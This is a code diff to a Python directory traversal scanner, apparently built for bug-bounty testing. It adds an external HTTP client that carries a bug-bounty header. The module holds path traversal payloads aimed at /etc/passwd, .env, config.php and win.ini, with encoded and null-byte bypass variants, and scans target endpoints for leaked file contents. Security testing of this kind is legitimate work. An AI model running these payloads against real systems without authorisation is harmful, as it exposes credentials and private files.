@@ -2,6 +2,8 @@
 """
 Module 13: Directory Traversal Scanner
 4 Layer path traversal detection | Waktu: 3-5 menit total | Akurasi: 90%
+
+MODIFIED: Added external HTTPClient support for X-Bug-Bounty header
 """
 
 import asyncio
@@ -13,10 +15,11 @@ from core.logger import Logger
 logger = Logger()
 
 class DirTraversalScanner:
-    def __init__(self, target: str, threads: int = 60, timeout: int = 3):
+    def __init__(self, target: str, threads: int = 60, timeout: int = 3, client: HTTPClient = None):
         self.target = target.rstrip('/')
         self.threads = threads
         self.timeout = timeout
+        self.client = client  # External client with X-Bug-Bounty header
         self.findings: List[Dict] = []
         self.stats = {
             'endpoints_tested': 0,
@@ -24,21 +27,20 @@ class DirTraversalScanner:
             'vulnerabilities_found': 0
         }
         
-        # ============ PARAMETERS (15 parameter - dikurangi) ============
+        # ============ PARAMETERS ============
         self.traversal_params = [
             'file', 'path', 'dir', 'folder', 'document', 'page', 'load',
             'include', 'view', 'filename', 'image', 'img', 'download', 'read', 'open'
         ]
         
-        # ============ ENDPOINTS (10 endpoint - dikurangi) ============
+        # ============ ENDPOINTS ============
         self.test_endpoints = [
             "/", "/download", "/file", "/image", "/view",
             "/include", "/load", "/read", "/api/download", "/assets"
         ]
         
-        # ============ CRITICAL PAYLOADS (20 payload - prioritas) ============
+        # ============ CRITICAL PAYLOADS ============
         self.critical_payloads = [
-            # Linux (yang paling sering ditemukan)
             '../../../../etc/passwd',
             '../../../etc/passwd',
             '../../etc/passwd',
@@ -47,17 +49,15 @@ class DirTraversalScanner:
             '../../../../etc/group',
             '../../../../var/www/html/.env',
             '../../../../var/www/html/config.php',
-            # Windows
             '../../../../Windows/win.ini',
             '../../../Windows/win.ini',
             '../../../../Windows/System32/drivers/etc/hosts',
             '../../../../boot.ini',
-            # Null byte
             '../../../../etc/passwd%00',
             '../../../../Windows/win.ini%00',
         ]
         
-        # ============ BYPASS PAYLOADS (10 payload) ============
+        # ============ BYPASS PAYLOADS ============
         self.bypass_payloads = [
             '....//....//....//etc/passwd',
             '..%2f..%2f..%2fetc%2fpasswd',
@@ -78,22 +78,54 @@ class DirTraversalScanner:
             'BEGIN RSA PRIVATE KEY', '127.0.0.1 localhost'
         ]
     
+    async def _get_client(self):
+        """Get HTTP client - use external if available, otherwise create new"""
+        if self.client:
+            return self.client
+        else:
+            return HTTPClient(self.target, timeout=self.timeout, retries=1)
+    
     async def test_traversal(self, endpoint: str, param: str, payload: str, platform: str) -> Optional[Dict]:
         """Test path traversal - DIPERCEPAT"""
+        client = await self._get_client()
+        url = f"{endpoint}?{param}={urllib.parse.quote(payload, safe='')}"
         
-        async with HTTPClient(self.target, timeout=self.timeout, retries=1) as client:
-            url = f"{endpoint}?{param}={urllib.parse.quote(payload, safe='')}"
-            
-            try:
+        try:
+            if not hasattr(client, 'session') or client.session is None:
+                async with client as ctx_client:
+                    response = await ctx_client.get(url)
+                    if response and response.status == 200:
+                        response_text = await response.text()
+                        body = response_text.lower() if response_text else ""
+                        
+                        for indicator in self.success_indicators:
+                            if indicator.lower() in body:
+                                fp_keywords = ['not found', 'no such file', 'access denied', 'error']
+                                is_fp = any(fp in body for fp in fp_keywords)
+                                
+                                if not is_fp and len(body) > 100:
+                                    severity = "critical" if 'passwd' in payload or 'shadow' in payload else "high"
+                                    
+                                    return {
+                                        "vulnerable": True,
+                                        "type": "DIRECTORY_TRAVERSAL",
+                                        "severity": severity,
+                                        "confidence": 95,
+                                        "endpoint": endpoint,
+                                        "parameter": param,
+                                        "payload": payload[:80],
+                                        "platform": platform,
+                                        "indicator": indicator,
+                                        "response_snippet": body[:300]
+                                    }
+            else:
                 response = await client.get(url)
-                
                 if response and response.status == 200:
                     response_text = await response.text()
                     body = response_text.lower() if response_text else ""
                     
                     for indicator in self.success_indicators:
                         if indicator.lower() in body:
-                            # False positive check
                             fp_keywords = ['not found', 'no such file', 'access denied', 'error']
                             is_fp = any(fp in body for fp in fp_keywords)
                             
@@ -112,8 +144,8 @@ class DirTraversalScanner:
                                     "indicator": indicator,
                                     "response_snippet": body[:300]
                                 }
-            except:
-                pass
+        except:
+            pass
         
         return None
     
@@ -130,10 +162,7 @@ class DirTraversalScanner:
                     findings.append(result)
                     self.stats['vulnerabilities_found'] += 1
                     icon = "💎" if result.get('severity') == 'critical' else "🔴"
-                    logger.finding(
-                        f"{icon} Directory Traversal on {endpoint} via {param}",
-                        f"Payload: {payload[:60]}"
-                    )
+                    logger.info(f"{icon} Directory Traversal on {endpoint} via {param}: {payload[:60]}")
                     return True
             return False
         
@@ -143,6 +172,7 @@ class DirTraversalScanner:
             found = await test_payload(payload, "Linux" if 'etc' in payload else "Windows")
             if found:
                 return findings
+            await asyncio.sleep(0.01)
         
         # Test bypass payloads
         for payload in self.bypass_payloads:
@@ -150,6 +180,7 @@ class DirTraversalScanner:
             found = await test_payload(payload, "Linux")
             if found:
                 return findings
+            await asyncio.sleep(0.01)
         
         return findings
     
@@ -241,9 +272,20 @@ class DirTraversalScanner:
             "high_vulnerabilities": len(high_findings),
             "findings": self.findings
         }
+
+
+# ================================================================
+# MAIN RUN FUNCTION - MODIFIED FOR EXTERNAL CLIENT
+# ================================================================
+async def run(target: str, custom_endpoints: List[str] = None, custom_params: List[str] = None, client: HTTPClient = None) -> Dict:
+    """
+    Run directory traversal scanner - DRYBT DIRECTORY TRAVERSAL SCANNER
     
-    @staticmethod
-    async def run(target: str, custom_endpoints: List[str] = None, custom_params: List[str] = None) -> Dict:
-        """Run directory traversal scanner"""
-        scanner = DirTraversalScanner(target)
-        return await scanner.scan(custom_endpoints, custom_params)
+    Args:
+        target: Target URL
+        custom_endpoints: Custom endpoints to test (optional)
+        custom_params: Custom parameters to test (optional)
+        client: Optional external HTTPClient (for X-Bug-Bounty header)
+    """
+    scanner = DirTraversalScanner(target, client=client)
+    return await scanner.scan(custom_endpoints, custom_params)
